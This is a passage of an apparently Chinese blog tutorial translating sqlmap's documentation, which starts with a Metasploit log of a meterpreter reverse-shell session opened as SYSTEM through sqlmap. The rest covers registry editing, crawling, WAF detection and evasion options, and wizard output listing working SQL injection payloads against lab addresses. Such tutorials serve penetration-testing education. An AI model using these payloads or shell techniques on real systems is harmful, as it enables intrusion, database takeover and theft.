+/ |/ |/ |&nbsp;&nbsp;|/&nbsp;&nbsp;|&nbsp;&nbsp;/&nbsp;&nbsp;|&nbsp;&nbsp;/ \_|/ \_|/&nbsp;&nbsp;/&nbsp;&nbsp;\_|&nbsp;&nbsp;|
+|&nbsp;&nbsp;|&nbsp;&nbsp;|_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/|
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\|
+
+
+&nbsp;&nbsp;&nbsp;&nbsp;=[ metasploit v3.7.0-dev [core:3.7 api:1.0]
++ -- --=[ 674 exploits - 351 auxiliary
++ -- --=[ 217 payloads - 27 encoders - 8 nops
+&nbsp;&nbsp;&nbsp;&nbsp;=[ svn r12272 updated 4 days ago (2011.04.07)
+
+PAYLOAD =&amp;gt; windows/meterpreter/reverse_tcp
+EXITFUNC =&amp;gt; thread
+LPORT =&amp;gt; 60641
+LHOST =&amp;gt; 192.168.136.1
+[*] Started reverse handler on 192.168.136.1:60641 
+[*] Starting the payload handler...
+[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_bineval', 
+please wait..
+[*] Sending stage (749056 bytes) to 192.168.136.129
+[*] Meterpreter session 1 opened (192.168.136.1:60641 -&amp;gt; 192.168.136.129:1689) at Mon Apr 11 
+hh:mm:52 +0100 2011
+
+meterpreter &amp;gt; Loading extension espia...success.
+meterpreter &amp;gt; Loading extension incognito...success.
+meterpreter &amp;gt; [-] The 'priv' extension has already been loaded.
+meterpreter &amp;gt; Loading extension sniffer...success.
+meterpreter &amp;gt; System Language : en_US
+OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: Windows .NET Server (Build 3790, Service Pack 2).
+Computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: W2K3R2
+Architecture&nbsp;&nbsp;&nbsp;&nbsp;: x86
+Meterpreter&nbsp;&nbsp;&nbsp;&nbsp; : x86/win32
+meterpreter &amp;gt; Server username: NT AUTHORITY\SYSTEM
+meterpreter &amp;gt; ipconfig
+
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address&nbsp;&nbsp;: 127.0.0.1
+Netmask&nbsp;&nbsp;&nbsp;&nbsp; : 255.0.0.0
+
+
+
+Intel(R) PRO/1000 MT Network Connection
+Hardware MAC: 00:0c:29:fc:79:39
+IP Address&nbsp;&nbsp;: 192.168.136.129
+Netmask&nbsp;&nbsp;&nbsp;&nbsp; : 255.255.255.0
+
+
+meterpreter &amp;gt; exit
+
+[*] Meterpreter session 1 closed.&nbsp;&nbsp;Reason: User exit
+</code></pre>
+<p>默认情况下MySQL在Windows上以SYSTEM权限运行，PostgreSQL在Windows与Linux中是低权限运行，Microsoft SQL Server 2000默认是以SYSTEM权限运行，Microsoft SQL Server 2005与2008大部分是以NETWORK SERVICE有时是LOCAL SERVICE。</p>
+<p>&nbsp;</p>
+<h2>对Windows注册表操作</h2>
+<hr />
+<p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持<strong>堆查询</strong>。 当然，当前连接数据库的用户也需要有权限操作注册表。</p>
+<p>&nbsp;</p>
+<h3>读取注册表值</h3>
+<p>参数：--reg-read</p>
+<h3>写入注册表值</h3>
+<p>参数：--reg-add</p>
+<h3>删除注册表值</h3>
+<p>参数：--reg-del</p>
+<h3>注册表辅助选项</h3>
+<p>参数：--reg-key，--reg-value，--reg-data，--reg-type</p>
+<p>需要配合之前三个参数使用，例子：</p>
+<div><code>$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1</code></div>
+<h2>常规参数</h2>
+<hr />
+<h3>从sqlite中读取session</h3>
+<p>参数：-s</p>
+<p>sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。</p>
+<h3>保存HTTP(S)日志</h3>
+<p>参数：-t</p>
+<p>这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。</p>
+<h3>非交互模式</h3>
+<p>参数：--batch</p>
+<p>用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p>
+<h3>强制使用字符编码</h3>
+<p>参数：--charset</p>
+<p>不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：</p>
+<div><code>--charset=GBK</code></div>
+<h3>爬行网站URL</h3>
+<p>参数：--crawl</p>
+<p>sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p>
+<p>例子：</p>
+<div>
+<div>$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3</div>
+<div>[...]</div>
+<div>[xx:xx:53] [INFO] starting crawler</div>
+<div>[xx:xx:53] [INFO] searching for links with depth 1</div>
+<div>[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while</div>
+<div>[xx:xx:53] [INFO] searching for links with depth 2</div>
+<div>[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'</div>
+<div>[xx:xx:00] [INFO] 42/56 links visited (75%)</div>
+<div>[...]</div>
+</div>
+<h3>规定输出到CSV中的分隔符</h3>
+<p>参数：--csv-del</p>
+<p>当dump保存为CSV格式时（--dump-format=CSV），需要一个分隔符默认是逗号，用户也可以改为别的 如：</p>
+<div><code>--csv-del=";"</code></div>
+<h3>DBMS身份验证</h3>
+<p>参数：--dbms-cred</p>
+<p>某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数，有的数据库有专门的运行机制，可以切换用户如Microsoft SQL Server的OPENROWSET函数</p>
+<h3>定义dump数据的格式</h3>
+<p>参数：--dump-format</p>
+<p>输出的格式可定义为：CSV，HTML，SQLITE</p>
+<h3>预估完成时间</h3>
+<p>参数：--eta</p>
+<p>可以计算注入数据的剩余时间。</p>
+<p>例如Oracle的布尔型盲注：</p>
+<div>
+<div>$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta</div>
+<div>&nbsp;</div>
+<div>[...]</div>
+<div>[hh:mm:01] [INFO] the back-end DBMS is Oracle</div>
+<div>[hh:mm:01] [INFO] fetching banner</div>
+<div>[hh:mm:01] [INFO] retrieving the length of query output</div>
+<div>[hh:mm:01] [INFO] retrieved: 64</div>
+<div>17% [========&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;] 11/64&nbsp;&nbsp;ETA 00:19</div>
+</div>
+<p>然后：</p>
+<div>
+<div>100% [===================================================] 64/64</div>
+<div>[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod</div>
+<div>&nbsp;</div>
+<div>web application technology: PHP 5.2.6, Apache 2.2.9</div>
+<div>back-end DBMS: Oracle</div>
+<div>banner:&nbsp;&nbsp;&nbsp;&nbsp;'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'</div>
+</div>
+<p>sqlmap先输出长度，预计完成时间，显示百分比，输出字符</p>
+<h3>刷新session文件</h3>
+<p>参数：--flush-session</p>
+<p>如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，重新测试该目标。</p>
+<h3>自动获取form表单测试</h3>
+<p>参数：--forms</p>
+<p>如果你想对一个页面的form表单中的参数测试，可以使用-r参数读取请求文件，或者通过--data参数测试。 但是当使用--forms参数时，sqlmap会自动从-u中的url获取页面中的表单进行测试。</p>
+<h3>忽略在会话文件中存储的查询结果</h3>
+<p>参数：--fresh-queries</p>
+<p>忽略session文件保存的查询，重新查询。</p>
+<h3>使用DBMS的hex函数</h3>
+<p>参数：--hex</p>
+<p>有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：</p>
+<p>针对PostgreSQL例子：</p>
+<div>
+<div>$ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors</div>
+<div>&nbsp;</div>
+<div>[...]</div>
+<div>[xx:xx:14] [INFO] fetching banner</div>
+<div>[xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)</div>
+<div>[xx:xx:15] [INFO] parsed error message: 'pg_query() [&lt;a href='function.pg-query'&gt;function.pg-query&lt;/a&gt;]: Query failed: ERROR:&nbsp;&nbsp;invalid input syntax for type numeric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:" in &lt;b&gt;/var/www/sqlmap/libs/pgsql.inc.php&lt;/b&gt; on line &lt;b&gt;35&lt;/b&gt;'</div>
+<div>[xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by</div>
+<div>GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2</div>
+<div>[...]</div>
+</div>
+<h3>自定义输出的路径</h3>
+<p>参数：--output-dir</p>
+<p>sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：--output-dir=/tmp</p>
+<h3>从响应中获取DBMS的错误信息</h3>
+<p>参数：--parse-errors</p>
+<p>有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用此参数可以显示出错误信息。</p>
+<div>
+<div>$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --parse-errors</div>
+<div>[...]</div>
+<div>[11:12:17] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</div>
+<div>[11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</div>
+<div>[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.</div>
+<div>&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'</div>
+<div>[11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</div>
+<div>[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.</div>
+<div>&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'</div>
+<div>[11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)</div>
+<div>[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.</div>
+<div>&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'</div>
+<div>[11:12:17] [INFO] target URL appears to have 3 columns in query</div>
+<div>[...]</div>
+</div>
+<h2>其他的一些参数</h2>
+<hr />
+<h3>使用参数缩写</h3>
+<p>参数：-z</p>
+<p>有使用参数太长太复杂，可以使用缩写模式。 例如：</p>
+<div><code>python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "www.target.com/vuln.php?id=1"</code></div>
+<p>可以写成：</p>
+<div><code>python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=1"</code></div>
+<p>还有：</p>
+<div><code>python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u "www.target.com/vuln.php?id=1"</code></div>
+<p>可以写成：</p>
+<div><code>python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.com/vuln.php?id=1"</code></div>
+<h3>成功SQL注入时警告&nbsp;</h3>
+<p>参数：--alert</p>
+<h3>设定会发的答案</h3>
+<p>参数：--answers</p>
+<p>当希望sqlmap提出输入时，自动输入自己想要的答案可以使用此参数： 例子：</p>
+<div>
+<div>$ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--technique=E --answers="extending=N" --batch</div>
+<div>[...]</div>
+<div>[xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'</div>
+<div>heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</div>
+<div>[xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] N</div>
+<div>[...]</div>
+</div>
+<h3>发现SQL注入时发出蜂鸣声</h3>
+<p>参数：--beep</p>
+<p>发现sql注入时，发出蜂鸣声。</p>
+<h3>启发式检测WAF/IPS/IDS保护</h3>
+<p>参数：--check-waf</p>
+<p>WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试</p>
+<p>例如：</p>
+<div><code>&amp;foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2&gt;1</code></div>
+<p>如果有保护的话可能返回结果会不同。</p>
+<h3>清理sqlmap的UDF(s)和表</h3>
+<p>参数：--cleanup</p>
+<p>清除sqlmap注入时产生的udf与表。</p>
+<h3>禁用彩色输出</h3>
+<p>参数：--desable-coloring</p>
+<p>sqlmap默认彩色输出，可以使用此参数，禁掉彩色输出。</p>
+<h3>使用指定的Google结果页面</h3>
+<p>参数：--gpage</p>
+<p>默认sqlmap使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试。</p>
+<h3>使用HTTP参数污染(Http parament pollution)</h3>
+<p>参数：-hpp</p>
+<p>HTTP参数污染可能会绕过WAF/IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效。</p>
+<h3>测试WAF/IPS/IDS保护</h3>
+<p>参数：--identify-waf</p>
+<p>sqlmap 可以尝试找出 WAF/IPS/IDS 保护，方便用户做出绕过方式。目前大约支持30种产品的识别。</p>
+<p>例如对一个受到ModSecurity WAF保护的MySQL例子：</p>
+<div>
+<div>$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --identify-waf -v 3</div>
+<div>[...]</div>
+<div>[xx:xx:23] [INFO] testing connection to the target URL</div>
+<div>[xx:xx:23] [INFO] heuristics detected web page charset 'ascii'</div>
+<div>[xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (United Security Providers)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application Firewall (BinarySEC)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application Firewall (art of defence Inc.)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisco Systems)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5 Networks)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Akamai Technologies)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application Firewall (Incapsula/Imperva)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application Firewall (Barracuda Networks)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application Security (IBM)'</div>
+<div>[xx:xx:23] [DEBUG] declared web page charset 'iso-8859-1'</div>
+<div>[xx:xx:23] [DEBUG] page not found (404)</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Firewall (Jiasule)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firewall (AQTRONIX)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'</div>
+<div>[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'</div>
+<div>[xx:xx:23] [CRITICAL]</div>
+<code><code>WAF/IDS/IPS identified 'ModSecurity: Open Source Web Application Firewall (Trustwave)'.</code></code>
+<div>Please consider usage of tamper scripts (option '--tamper')</div>
+<div>[...]</div>
+</div>
+<h3>模仿智能手机</h3>
+<p>参数：--mobile</p>
+<p>有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</p>
+<p>例如：</p>
+<div>
+<div>$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" --mobile</div>
+<div>[...]</div>
+<div>which smartphone do you want sqlmap to imitate through HTTP User-Agent header?</div>
+<div>[1] Apple iPhone 4s (default)</div>
+<div>[2] BlackBerry 9900</div>
+<div>[3] Google Nexus 7</div>
+<div>[4] HP iPAQ 6365</div>
+<div>[5] HTC Sensation</div>
+<div>[6] Nokia N97</div>
+<div>[7] Samsung Galaxy S</div>
+<div>&gt; 1</div>
+<div>[...]</div>
+</div>
+<h3>安全的删除output目录的文件</h3>
+<p>参数：--purge-output</p>
+<p>有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</p>
+<p>例如：</p>
+<div>
+<div>$ python sqlmap.py --purge-output -v 3</div>
+<div>[...]</div>
+<div>[xx:xx:55] [INFO] purging content of directory '/home/user/sqlmap/output'...</div>
+<div>[xx:xx:55] [DEBUG] changing file attributes</div>
+<div>[xx:xx:55] [DEBUG] writing random data to files</div>
+<div>[xx:xx:55] [DEBUG] truncating files</div>
+<div>[xx:xx:55] [DEBUG] renaming filenames to random values</div>
+<div>[xx:xx:55] [DEBUG] renaming directory names to random values</div>
+<div>[xx:xx:55] [DEBUG] deleting the whole directory tree</div>
+<div>[...]</div>
+</div>
+<h3>启发式判断注入</h3>
+<p>参数：--smart</p>
+<p>有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。</p>
+<p>例子：</p>
+<div>
+<div>$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1" --batch --smart</div>
+<div>[...]</div>
+<div>[xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic</div>
+<div>[xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic</div>
+<div>[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable</div>
+<div>[xx:xx:14] [INFO] skipping GET parameter 'ca'</div>
+<div>[xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic</div>
+<div>[xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic</div>
+<div>[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable</div>
+<div>[xx:xx:14] [INFO] skipping GET parameter 'user'</div>
+<div>[xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic</div>
+<div>[xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic</div>
+<div>[xx:xx:14] [INFO] GET parameter 'id' is dynamic</div>
+<div>[xx:xx:14] [WARNING] reflective value(s) found and filtering out</div>
+<div>[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')</div>
+<div>[xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'</div>
+<div>heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</div>
+<div>do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] Y</div>
+<div>[xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'</div>
+<div>[xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable</div>
+<div>[xx:xx:14] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'</div>
+<div>[xx:xx:14] [INFO] GET parameter 'id' is 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause' injectable</div>
+<div>[xx:xx:14] [INFO] testing 'MySQL inline queries'</div>
+<div>[xx:xx:14] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries'</div>
+<div>[xx:xx:14] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query)'</div>
+<div>[xx:xx:14] [INFO] testing 'MySQL &gt; 5.0.11 AND time-based blind'</div>
+<div>[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL &gt; 5.0.11 AND time-based blind' injectable</div>
+<div>[xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'</div>
+<div>[xx:xx:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found</div>
+<div>[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</div>
+<div>[xx:xx:24] [INFO] target URL appears to have 3 columns in query</div>
+<div>[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable</div>
+<div>[...]</div>
+</div>
+<h3>初级用户向导参数</h3>
+<p>参数：--wizard 面向初级用户的参数，可以一步一步教你如何输入针对目标注入。</p>
+<div>
+<div>$ python sqlmap.py --wizard</div>
+<div>&nbsp;</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool</div>
+<div>&nbsp;</div>
+<div>http://sqlmap.org</div>
+<div>&nbsp;</div>
+<div>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</div>
+<div>&nbsp;</div>
+<div>[*] starting at 11:25:26</div>
+<div>&nbsp;</div>
+<div>Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1</div>
+<div>POST data (--data) [Enter for None]:</div>
+<div>Injection difficulty (--level/--risk). Please choose:</div>
+<div>[1] Normal (default)</div>
+<div>[2] Medium</div>
+<div>[3] Hard</div>
+<div>&gt; 1</div>
+<div>Enumeration (--banner/--current-user/etc). Please choose:</div>
+<div>[1] Basic (default)</div>
+<div>[2] Smart</div>
+<div>[3] All</div>
+<div>&gt; 1</div>
+<div>&nbsp;</div>
+<div>sqlmap is running, please wait..</div>
+<div>&nbsp;</div>
+<div>heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</div>
+<div>do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1)? [Y/n] Y</div>
+<div>GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</div>
+<div>sqlmap identified the following injection points with a total of 25 HTTP(s) requests:</div>
+<div>---</div>
+<div>Place: GET</div>
+<div>Parameter: id</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Type: boolean-based blind</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Title: AND boolean-based blind - WHERE or HAVING clause</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Payload: id=1 AND 2986=2986</div>
+<div>&nbsp;</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Type: error-based</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)))</div>
+<div>&nbsp;</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Type: UNION query</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Title: Generic UNION query (NULL) - 3 columns</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) CHAR(70) CHAR(79) CHAR(118) CHAR(106) CHAR(87) CHAR(101) CHAR(119) CHAR(115) CHAR(114) CHAR(77) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)--</div>
+<div>&nbsp;</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Type: stacked queries</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Title: Microsoft SQL Server/Sybase stacked queries</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Payload: id=1; WAITFOR DELAY '0:0:5'--</div>
+<div>&nbsp;</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Type: AND/OR time-based blind</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Title: Microsoft SQL Server/Sybase time-based blind</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Payload: id=1 WAITFOR DELAY '0:0:5'--</div>
+<div>&nbsp;</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Type: inline query</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Title: Microsoft SQL Server/Sybase inline queries</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Payload: id=(SELECT CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58))</div>
+<div>---</div>
+<div>web server operating system: Windows XP</div>
+<div>web application technology: ASP, Microsoft IIS 5.1</div>
+<div>back-end DBMS operating system: Windows XP Service Pack 2</div>
+<div>back-end DBMS: Microsoft SQL Server 2005</div>
+<div>banner:</div>
+<div>---</div>
+<div>Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86)</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Oct 14 2005 00:33:37</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Copyright (c) 1988-2005 Microsoft Corporation</div>
+<div>&nbsp;&nbsp;&nbsp;&nbsp;Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)</div>
+<div>---</div>
+<div>current user:&nbsp;&nbsp;&nbsp;&nbsp;'sa'</div>
+<div>current database:&nbsp;&nbsp;&nbsp;&nbsp;'testdb'</div>
+<div>current user is DBA:&nbsp;&nbsp;&nbsp;&nbsp;True</div>
+<div>&nbsp;</div>
+<div>[*] shutting down at 11:25:52</div>
+</div>
+</div>
+<div>&nbsp;</div>
+<div>&nbsp;</div>
+<div>&nbsp;</div></div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+
+
+		</div>
+		<div class = "postDesc">posted @ <span id="post-date">2018-04-13 22:09</span> <a href='../index.html'>疏桐</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href ="https://i.cnblogs.com/EditPosts.aspx?postid=8824167" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(8824167);return false;">收藏</a></div>
+	</div>
+	<script type="text/javascript">var allowComments=true,cb_blogId=395031,cb_entryId=8824167,cb_blogApp=currentBlogApp,cb_blogUserGuid='98a452d3-9c6b-41c0-b8f3-08d523685c8c',cb_entryCreatedDate='2018/4/13 22:09:00';loadViewCount(cb_entryId);var cb_postType=1;var isMarkdown=false;</script>
+	
+</div><!--end: topics 文章、评论容器-->
